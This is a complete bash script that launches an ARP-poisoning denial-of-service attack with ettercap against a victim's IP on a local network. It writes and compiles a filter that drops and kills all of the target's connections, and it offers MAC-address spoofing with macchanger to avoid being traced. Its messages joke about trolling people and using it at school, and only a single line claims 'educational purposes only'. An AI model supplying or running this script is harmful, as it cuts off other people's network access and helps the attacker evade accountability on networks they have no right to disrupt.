#!/bin/bash

if [ "$EUID" -ne 0 ]; then
	echo "You need to run this script as sudo or root user"
	exit
fi

if [ ! -x "/usr/bin/ettercap" ]; then
	echo "No ettercap has been detected"
	exit
fi

echo "Spoofing MAC address makes your computer harder to track if you're using this for trolling someone you shouldn't"
echo "This script will look for macchanger installation and run it for you"
read -p "Do you want to spoof your MAC address? (Type Y for YES, any other key for NO): " -n 1 -r
if [[ $REPLY =~ ^[Yy]$ ]]; then
	if [ ! -x "/usr/bin/macchanger" ]; then
		echo "No macchanger has been detected"
		echo "Are you even running Kali or ParrotOS?"
		echo "You may be in trouble if you run this in your school for example"
		read -p "Do you still want to run the script? (Type Y to continue, any other key to exit): " -n 1 -r
		if [[ ! $REPLY =~ ^[Yy]$ ]]; then
			exit
		fi
		echo
		echo
		echo "I like the way you think, but you should be less reckless ;)"
	else
		echo "Type te interface name used by your computer to access victim's network"
		echo "The interface will also be used to perform the DoS"
		read -p "Normally it should be eth0: " iface
		ifconfig $iface down
		macchanger -r $iface
		ifconfig $iface up
	fi
fi

echo
echo
echo "####################################"
echo "#    We do a little trolling...    #"
echo "####################################"

echo "#################################################################################################"
echo "# Author: Guillermo Jimenez                                                                     #"
echo "# Description: Intercepts and kills all connections of the target host's IP using ARP Poisoning #"
echo "# For educational purposes only                                                                 #"
echo "# You may end the attack by pressing Q                                                          #"
echo "# Remember that this DoS method only works with victims inside the same network                 #"
echo "#################################################################################################"

read -p "Input victim's IP (Last chance to press CTRL + C and forget about this): " ip

if [ -e /tmp/dos.elt ]; then
	rm -f /tmp/dos.elt
fi

# Write the filter script
echo "if (ip.src == '$ip' || ip.dst == '$ip')" >> /tmp/dos.elt
echo "{" >> /tmp/dos.elt
echo "drop();" >> /tmp/dos.elt
echo "kill();" >> /tmp/dos.elt
echo "msg(\"A connection of the victim has been killed!\");" >> /tmp/dos.elt
echo "}" >> /tmp/dos.elt

# Compile it
etterfilter /tmp/dos.elt -o /tmp/dos.ef

# REKT HIM
ettercap -T -q -F /tmp/dos.ef -M ARP /$ip//